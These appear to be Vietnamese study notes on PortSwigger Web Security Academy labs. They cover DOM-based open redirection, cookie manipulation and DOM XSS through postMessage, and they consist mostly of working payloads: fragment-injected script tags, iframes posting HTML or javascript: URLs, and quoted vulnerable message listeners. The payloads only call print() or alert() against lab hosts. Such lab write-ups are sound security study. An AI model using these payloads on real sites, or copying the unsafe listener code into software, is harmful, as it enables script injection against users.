
1.DOM-based open redirection
```
&url=https://EXPLOIT_SERVER_ID/  
```


2.DOM-based cookie manipulation
Dựng payload trigger XSS
```
productId=17#'onclick='alert(1); # cần click để trigger
'><script>print()</script> # không cần click ( bản chất vẫn là xss injection vào chuỗi)

```

Kết hợp với exploit server:
```js
<iframe
  src="https://0ab600d904fd6d1380f503e300e10078.web-security-academy.net/product?productId=1#'><script>print()</script>"
  onload="if(!window.x)this.src='https://0ab600d904fd6d1380f503e300e10078.web-security-academy.net/';window.x=1;"
></iframe>
```
> Note: Cách tấn cần này chỉ hoạt động với chrome

3.DOM XSS using web messages
Đoạn mã có lỗ hổng
```js
<script>
	window.addEventListener('message', function(e) {
		document.getElementById('ads').innerHTML = e.data;
	})
</script>
```
Hướng tấn công là từ trang exploit của kẻ tân công tạo 1 iframe và thực hiện gửi messages chứa nội dung nguy hiểm
```js
<iframe
  src="vulnsite"
  onload="this.contentWindow.postMessage('<img src=x onerror=print()>','*')"
></iframe>
```

4.DOM XSS using web messages and a JavaScript URL
Đoạn mã có lỗ hỏng
```js
<script>
	window.addEventListener('message', function(e) {
		var url = e.data;
		if (url.indexOf('http:') > -1 || url.indexOf('https:') > -1) {
			location.href = url;
		}
	}, false);
</script>
```
Payload
```js
<iframe
  src="vulnsite"
  onload="this.contentWindow.postMessage('javascript:print();//https:','*')"
></iframe>
```

5.DOM XSS using web messages and `JSON.parse`
Kịch bản không khác case 3 và 4. 
```js
<iframe src='vulnsite' onload="this.contentWindow.postMessage(
  JSON.stringify({
    type: 'load-channel',
    url: 'javascript:print()'
  }),
  '*'
);">
</iframe>
```